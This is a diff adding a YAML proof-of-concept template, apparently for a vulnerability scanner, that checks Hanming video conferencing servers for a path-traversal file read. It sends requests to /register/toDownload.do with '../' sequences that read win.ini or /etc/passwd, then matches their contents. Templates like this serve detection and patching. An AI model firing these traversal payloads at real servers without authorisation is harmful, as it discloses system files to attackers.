@@ -1,0 +1,20 @@
+name: poc-yaml-hanming-video-conferencing-file-read
+groups:
+  windows:
+    - method: GET
+      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+      follow_redirects: false
+      expression: |
+        response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+
+  linux:
+    - method: GET
+      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+
+detail:
+  author: kzaopa(https://github.com/kzaopa)
+  links:
+    - https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA
